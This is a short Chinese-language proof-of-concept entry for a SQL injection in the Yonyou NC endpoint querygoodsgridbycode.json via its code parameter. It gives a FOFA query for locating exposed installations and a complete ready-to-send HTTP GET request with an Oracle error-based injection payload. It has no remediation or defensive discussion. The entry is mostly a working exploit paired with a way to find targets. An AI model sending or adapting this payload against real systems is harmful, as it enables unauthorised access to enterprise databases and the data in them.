# 用友NC系统querygoodsgridbycode接口code参数存在SQL注入漏洞

用友NC 接口 `/ecp/productonsale/querygoodsgridbycode.json` 存在SQL注入漏洞

## fofa

```yaml
app="用友-UFIDA-NC"
```

## poc

```yaml
GET /ecp/productonsale/querygoodsgridbycode.json?code=1%27%29+AND+9976%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%289976%3D9976%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29--+dpxi HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cache-Control: no-cache
```

